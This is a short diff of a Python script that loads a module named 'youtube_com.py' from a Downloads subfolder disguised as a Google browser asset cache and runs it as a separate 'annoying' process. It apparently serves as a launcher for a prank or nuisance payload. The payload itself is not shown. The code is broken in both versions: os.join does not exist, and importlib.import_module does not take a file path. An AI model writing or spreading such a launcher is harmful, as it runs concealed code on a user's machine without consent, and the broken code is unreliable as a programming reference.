@@ -1,8 +1,12 @@
 import os, time
 from multiprocessing import Process
+import importlib
 home_dir = os.path.expanduser("~")
-payload_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/"
-annoying = __import__(os.join(payload_path), "youtube_com.py")
+payload_path = f"{home_dir}\\Downloads\\Google_Stable_x64\\assets\\cache"
+
+annoying = importlib.import_module(os.path.join(payload_path, "youtube_com.py"))
+
+
 annoying_func_thread = Process(target=annoying.start)
 annoying_func_thread.start()
 
